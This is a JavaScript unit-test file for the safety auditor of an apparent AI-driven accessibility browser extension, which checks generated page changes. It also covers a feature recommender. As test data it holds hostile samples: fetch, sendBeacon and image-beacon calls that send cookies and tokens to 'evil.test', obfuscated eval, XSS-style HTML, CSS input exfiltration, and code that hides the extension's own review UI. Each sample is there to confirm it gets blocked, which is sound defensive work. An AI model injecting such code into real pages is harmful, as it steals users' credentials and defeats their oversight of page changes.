// Safety auditor & recommender unit tests:  node test/verify-safety.js
const assert = require('assert');
const { auditProposal } = require('../shared/safety.js');
const R = require('../shared/recommender.js');

let passed = 0;
const t = (name, fn) => { fn(); passed++; console.log('✔', name); };
const codes = (a) => a.findings.map(f => f.code);

const page = {
  domain: 'www.example-search.com', url: 'https://www.example-search.com/',
  interactiveMap: [
    { selector: '#search-btn', tag: 'button', text: '검색' },
    { selector: 'form > input:nth-child(1)', tag: 'input', text: '검색어 입력' }
  ]
};

t('문서의 시나리오: 검색 버튼을 메일 보내기로 바꾸는 JS 는 차단된다', () => {
  const a = auditProposal({ generatedJs: { '#search-btn': "el.addEventListener('click',()=>{ window.location.href='mailto:a@b.c?body='+document.title })" } }, page);
  assert.deepStrictEqual(a.sanitized.generatedJs, {});
  assert.ok(a.blockedCount >= 1);
});

t('기존 버튼에 무해한 JS 를 붙여도 "기능 변경" 고위험 경고가 뜬다', () => {
  const a = auditProposal({ generatedJs: { '#search-btn': "el.addEventListener('click',()=>{ el.style.background='red' })" } }, page);
  assert.ok(codes(a).includes('JS_REMAP_EXISTING_CONTROL'));
  assert.strictEqual(a.riskLevel, 'high');
  assert.ok(a.sanitized.generatedJs['#search-btn']);
});

t('기존 버튼 문구 바꿔치기(DOM/CSS)는 고위험', () => {
  const a = auditProposal({ generatedDom: [{ parentSelector: '#search-btn', isModify: true, textContent: '메일 보내기' }] }, page);
  assert.ok(codes(a).includes('DOM_LABEL_CHANGE'));
  const b = auditProposal({ generatedCss: '#search-btn::after { content: "메일 보내기" !important; }' }, page);
  assert.ok(codes(b).includes('CSS_LABEL_SPOOF'));
  assert.strictEqual(b.riskLevel, 'high');
});

t('네트워크/쿠키/eval/난독화 JS 는 모두 제거', () => {
  for (const js of [
    "fetch('https://evil.test/?c='+document.cookie)",
    "navigator.sendBeacon('https://evil.test', el.value)",
    "eval(atob('YWxlcnQoMSk='))",
    "new Image().src='https://evil.test/'+localStorage.token",
    "document.forms[0].submit()",
    "window['fe'+'tch']('https://evil.test')"
  ]) {
    const a = auditProposal({ generatedJs: { '#equali-inj-x': js } }, page);
    assert.deepStrictEqual(a.sanitized.generatedJs, {}, js);
  }
});

t('새로 만든 요소의 무해한 JS 는 통과하되 위험도는 medium 이상', () => {
  const a = auditProposal({ generatedJs: { '#equali-inj-top': "el.addEventListener('click',()=>window.scrollTo({top:0,behavior:'smooth'}))" } }, page);
  assert.ok(a.sanitized.generatedJs['#equali-inj-top']);
  assert.strictEqual(a.riskLevel, 'medium');
});

t('HTML: script/iframe/form/on* 차단, 입력창은 고위험 경고', () => {
  for (const html of ['<script>alert(1)</script>', '<div><iframe src="https://x.test"></iframe></div>', '<img src="https://x.test/a.png" onerror="alert(1)">', '<a href="javascript:alert(1)">x</a>', '<form action="https://evil.test"><input name="pw"></form>']) {
    const a = auditProposal({ generatedDom: [{ parentSelector: 'body', html }] }, page);
    assert.strictEqual(a.sanitized.generatedDom.length, 0, html);
  }
  const b = auditProposal({ generatedDom: [{ parentSelector: 'body', html: '<div id="equali-inj-a"><input type="text"></div>' }] }, page);
  assert.ok(codes(b).includes('DOM_INPUT_FIELD'));
});

t('CSS: @import·비HTTPS url·입력값 유출·전역 숨김 제거, 정상 규칙은 보존', () => {
  const a = auditProposal({ generatedCss: `
    @import url("https://evil.test/x.css");
    input[value^="a"] { background: url("https://evil.test/a") !important; }
    body { background-image: url("http://insecure.test/x.png") !important; font-size: 18px !important; }
    button { display: none !important; color: red !important; }
    aside.sidebar { display: none !important; }
    @media (prefers-reduced-motion: no-preference) { main p { line-height: 1.8 !important; } }
  ` }, page);
  const css = a.sanitized.generatedCss;
  assert.ok(!/@import|evil\.test|insecure\.test/.test(css));
  assert.ok(/font-size: 18px/.test(css));
  assert.ok(/button \{[^}]*color: red/.test(css) && !/button \{[^}]*display/.test(css));
  assert.ok(/aside\.sidebar \{ display: none/.test(css));
  assert.ok(/line-height: 1\.8/.test(css));
  for (const c of ['CSS_IMPORT', 'CSS_EXFIL', 'CSS_UNSAFE_URL', 'CSS_HIDE_GLOBAL']) assert.ok(codes(a).includes(c), c);
});

t('안전 장치 UI(검토 카드·호스트)를 겨냥한 CSS/JS 는 제거하고 알린다', () => {
  const a = auditProposal({ generatedCss: 'equali-ui-host { display:none !important } .equali-rv-approve, p { color:red } #equali-inj-top { color: blue } button { display:none }' }, page);
  assert.ok(codes(a).includes('CSS_TARGETS_SAFETY_UI'));
  assert.ok(!/equali-ui-host|equali-rv/.test(a.sanitized.generatedCss));
  assert.ok(/#equali-inj-top/.test(a.sanitized.generatedCss), '우리가 추가한 요소의 스타일은 허용');
  assert.ok(!/button\s*\{/.test(a.sanitized.generatedCss), '빈 규칙은 남기지 않는다');
  const b = auditProposal({ generatedJs: { '#equali-inj-x': "document.querySelector('equali-ui-host').remove()" } }, page);
  assert.deepStrictEqual(b.sanitized.generatedJs, {});
});

t('opacity: 0.5 는 숨김으로 오탐하지 않는다 / 순수 CSS 는 low', () => {
  const a = auditProposal({ generatedCss: 'button { opacity: 0.5 !important; } main p { font-size: 20px !important; }' }, page);
  assert.ok(!codes(a).includes('CSS_HIDE_GLOBAL'));
  assert.strictEqual(a.riskLevel, 'low');
});

t('민감 페이지(비밀번호/결제)에서는 CSS 만 남긴다', () => {
  const a = auditProposal({
    generatedCss: 'p { font-size: 20px !important; }',
    generatedDom: [{ parentSelector: 'body', html: '<div>hi</div>' }],
    generatedJs: { '#equali-inj-a': 'el.style.color="red"' }
  }, { ...page, hasPasswordField: true });
  assert.ok(a.sensitiveContext && a.sanitized.generatedCss);
  assert.strictEqual(a.sanitized.generatedDom.length, 0);
  assert.deepStrictEqual(a.sanitized.generatedJs, {});
  assert.ok(auditProposal({ generatedJs: { a: 'el.focus()' } }, { domain: 'login.bank.example', interactiveMap: [] }).sensitiveContext);
});

/* ---------------- Fixed component set ---------------- */
const parts = (components, pd = page) => auditProposal({ components }, pd);

t('부품: 허용 목록 밖의 종류·HTML 은 받지 않고, 글자는 길이 제한된 순수 텍스트로만 남는다', () => {
  const a = parts([
    { type: 'iframe', props: { src: 'https://evil.test' } },
    { type: 'notice', anchor: 'main', position: 'prepend', props: { title: 'x'.repeat(500), body: '<img src=x onerror=alert(1)> 쉬운 설명', html: '<script>1</script>', onclick: 'alert(1)' } }
  ]);
  assert.ok(codes(a).includes('COMPONENT_UNKNOWN'));
  assert.strictEqual(a.sanitized.components.length, 1);
  const c = a.sanitized.components[0];
  assert.deepStrictEqual(Object.keys(c.props).sort(), ['body', 'title']);
  assert.strictEqual(c.props.title.length, 60);
  assert.strictEqual(a.riskLevel, 'high', '차단된 항목이 있으면 확인 체크를 요구한다');
  assert.strictEqual(parts([{ type: 'notice', props: { body: '쉬운 설명' } }]).riskLevel, 'medium', '부품은 AI 가 쓴 글이 들어가므로 항상 검토 대상(자동 적용 안 됨)');
});

t('부품: 문서의 시나리오 — 이름은 "검색"인데 실제 대상은 "메일 보내기" 버튼이면 고위험으로 알린다', () => {
  const pd = { ...page, interactiveMap: [{ selector: '#mail-btn', text: '메일 보내기' }, { selector: '#search-btn', text: '검색' }] };
  const bad = parts([{ type: 'quick_actions', anchor: 'main', props: { actions: [{ label: '검색', targetSelector: '#mail-btn' }] } }], pd);
  assert.ok(codes(bad).includes('COMPONENT_LABEL_MISMATCH'));
  assert.strictEqual(bad.riskLevel, 'high');
  const good = parts([{ type: 'quick_actions', anchor: 'main', props: { actions: [{ label: '🔍 검색하기', targetSelector: '#search-btn' }] } }], pd);
  assert.ok(!codes(good).includes('COMPONENT_LABEL_MISMATCH'));
});

t('부품: 비밀번호 입력란을 가리키거나, 연락처·민감정보 입력을 유도하는 글은 막거나 경고', () => {
  assert.strictEqual(parts([{ type: 'read_aloud', props: { targetSelector: 'input[type=password]' } }]).sanitized.components.length, 0);
  assert.ok(codes(parts([{ type: 'notice', props: { body: '문의는 https://evil.test 또는 010-1234-5678' } }])).includes('COMPONENT_CONTACT_TEXT'));
  assert.ok(codes(parts([{ type: 'steps', props: { steps: [{ text: '인증번호를 아래 칸에 입력하세요' }] } }])).includes('COMPONENT_SENSITIVE_TEXT'));
  assert.strictEqual(parts([{ type: 'notice', anchor: '.equali-rv-card', props: { body: 'x' } }]).sanitized.components[0].anchor.includes('equali'), false);
});

t('부품: 민감 페이지에서는 정보성 부품만, 개수는 최대 4개, 떠 있는 부품은 위치 고정', () => {
  const sens = parts([{ type: 'quick_actions', props: { actions: [{ label: '로그인', targetSelector: '#login' }] } }, { type: 'glossary', props: { terms: [{ term: 'OTP', meaning: '일회용 번호' }] } }], { ...page, hasPasswordField: true });
  assert.deepStrictEqual(sens.sanitized.components.map(c => c.type), ['glossary']);
  const many = parts(Array.from({ length: 6 }, (_, i) => ({ type: 'notice', props: { body: '안내 ' + i } })));
  assert.strictEqual(many.sanitized.components.length, 4);
  assert.strictEqual(parts([{ type: 'back_to_top', anchor: 'main', position: 'prepend' }]).sanitized.components[0].position, 'floating');
  assert.strictEqual(parts([{ type: 'steps', props: { steps: [] } }]).sanitized.components.length, 0);
});

/* ---------------- Recommender ---------------- */
const base = { domain: 'news.example.com', pageType: 'article', now: 1e12 };

t('근거 없는 페이지에서는 아무것도 제안하지 않는다', () => {
  assert.deepStrictEqual(R.rankRecommendations({ ...base, domain: 'x.test', pageType: 'general_webpage', signals: { textLength: 300 } }), []);
});

t('작은 글자 + 확대 행동 → 큰 글꼴을 이유와 함께 제안', () => {
  const r = R.rankRecommendations({ ...base, signals: { fontPx: 12, zoomEvents: 1, textLength: 900 } });
  assert.strictEqual(r[0].featureId, 'large_font');
  assert.ok(r[0].reasons.length >= 2);
});

t('자막 없는 영상 → 자막 제안 / 영상 없으면 제안 안 함', () => {
  assert.strictEqual(R.rankRecommendations({ ...base, domain: 'v.test', signals: { hasVideo: true, videoHasCaptions: false } })[0].featureId, 'live_captions');
  assert.ok(!R.rankRecommendations({ ...base, signals: { hasVideo: false, textLength: 5000 } }).some(x => x.featureId === 'live_captions'));
});

t('영구 배제(객체 형태 negativeRules)·쿨다운·스누즈·이미 켜진 기능은 제외', () => {
  const sig = { fontPx: 12, zoomEvents: 2, textLength: 900 };
  const has = (extra) => R.rankRecommendations({ ...base, signals: sig, ...extra }).some(x => x.featureId === 'large_font');
  assert.ok(has({}));
  assert.ok(!has({ negativeRules: [{ featureId: 'large_font' }] }));
  assert.ok(!has({ cooldowns: { 'news.example.com:large_font': 1e12 + 1000 } }));
  assert.ok(!has({ snoozeUntil: 1e12 + 1000 }));
  assert.ok(!has({ activeFeatures: ['large_font'] }));
});

t('거절이 쌓이면 같은 맥락에서 점수가 내려가고, 수락이 쌓이면 올라간다', () => {
  const sig = { textLength: 3000, avgSentenceLength: 70 };
  const score = (recStats) => (R.rankRecommendations({ ...base, signals: sig, recStats }).find(x => x.featureId === 'plain_summary') || { score: 0 }).score;
  let neg = {}, pos = {};
  for (let i = 0; i < 5; i++) { neg = R.updateRecStats(neg, 'plain_summary', 'article', 'dismissed'); pos = R.updateRecStats(pos, 'plain_summary', 'article', 'accepted'); }
  assert.ok(score(neg) < score({}) && score({}) < score(pos));
});

t('사용자 특성(저시력)이 관련 기능을 끌어올린다', () => {
  const r = R.rankRecommendations({ ...base, signals: { textLength: 2000 }, traitInsights: ['저시력이라 큰 글씨 선호'] });
  assert.ok(r.some(x => ['large_font', 'high_contrast', 'tts_reader'].includes(x.featureId)));
  assert.ok(r[0].reasons.some(x => x.includes('사용자 특성')));
});

console.log(`\n${passed} tests passed`);
